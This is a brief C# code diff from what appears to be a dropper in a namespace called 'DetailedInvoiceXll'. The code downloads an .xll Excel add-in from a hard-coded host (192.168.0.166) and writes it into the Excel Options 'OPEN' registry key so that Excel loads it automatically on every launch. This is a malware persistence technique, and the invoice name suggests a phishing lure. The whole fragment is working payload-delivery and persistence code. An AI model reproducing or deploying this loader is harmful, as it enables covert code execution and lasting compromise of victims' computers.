@@ -14,7 +14,7 @@ namespace DetailedInvoiceXll
             WebClient client = new WebClient();
             client.DownloadFile("http://192.168.0.166/HelloFromXll.xll", droplocation);
             RegistryKey registryKey64 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(@"SOFTWARE\Microsoft\Office\16.0\Excel\Options", true);
-            registryKey64.SetValue("OPEN", droplocation);
+            registryKey64.SetValue("OPEN", "/R HelloFromXll.xll");
 
         }
         static void Main(string[] args)
